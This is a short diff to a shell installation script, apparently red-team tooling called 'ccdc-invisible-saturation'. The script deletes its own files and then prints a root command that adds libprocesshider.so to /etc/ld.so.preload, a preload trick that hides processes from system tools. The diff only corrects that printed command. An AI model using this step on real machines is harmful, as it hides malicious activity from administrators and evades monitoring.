@@ -52,5 +52,5 @@ cd .. && rm -rf ccdc-invisible-saturation dev-inventory.yml
 
 echo "Script execution completed successfully."
 echo "To finish installation, use "
-echo "/usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
+echo "echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload"
 echo "As root"
